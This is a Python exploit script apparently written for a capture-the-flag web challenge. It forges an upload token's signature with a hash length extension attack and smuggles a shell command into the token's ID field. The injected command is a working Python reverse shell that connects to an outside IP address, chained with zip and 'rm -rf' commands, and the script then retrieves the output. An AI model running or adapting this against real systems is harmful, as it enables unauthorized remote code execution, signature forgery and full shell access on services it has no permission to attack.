#!/usr/bin/python3
# -*- coding:utf8 -*-

import base64
import hashpumpy
import json
import sys
import uuid

import requests

host = '72a27156-8313-47d2-82c6-357118c82db0.node3.buuoj.cn'
port = ''
command = """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("174.2.217.127",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
# "java -Dspring.profiles.active=prod/localhost -jar /tmp/fl.jar"


def uploadTestFile():
    r = requests.post("http://" + host + ":"  + "/api/upload",
                      files=[('file', ('testa.txt', 'abcd'))])
    return r.json()['data']['token']


def rceToGetFile(token):
    filename = str(uuid.uuid4())
    data = json.loads(base64.b64decode(token))
    id = base64.b64decode(data['id'])
    sign = base64.b64decode(data['sign'])
    result = hashpumpy.hashpump(sign, id,
                                ';' + command + ' >> ' + filename + '.txt;zip ' + filename + '.zip ' + filename + '.txt;rm -rf ' + filename + '.txt;',
                                32)

    data['id'] = base64.b64encode(result[1]).decode()
    data['sign'] = base64.b64encode(result[0].encode()).decode()

    token = base64.b64encode(json.dumps(data).encode())

    try:
        requests.get("http://" + host + ":"  + "/api/upload", params={'token': token}, timeout=5)
    except:
        pass
    return filename


def getTargetFileToken(filename):
    r = requests.get("http://" + host + ":"  + "/api/upload/list")
    data = r.json()['data']
    for item in data:
        if item['id'] == filename:
            return item['token']
    return None

def getFlag(token):
    r = requests.get("http://" + host + ":"  + "/api/upload", params={'token': token})

    origin_text = r.text
    return origin_text


if __name__ == '__main__':
    print("[*]上传测试文件，获取 Token 中....")
    token = uploadTestFile()
    print("[+]Token:" + token)
    print("[*]在 Token 的 ID 后追加字符串造成 RCE，并利用 Hash 长度扩展攻击来计算新的 sign。")
    filename = rceToGetFile(token)
    print("[+]Flag 已被保存到服务器上的文件：" + filename)
    print("[*]从文件列表中获取该文件的 Token：")
    flag_token = getTargetFileToken(filename)
    print("[+]Token 获取成功，Token:" + flag_token)
    print("[*]正在下载结果文件：")
    flag = getFlag(flag_token)
    print("[+]结果下载成功，结果：" + flag)
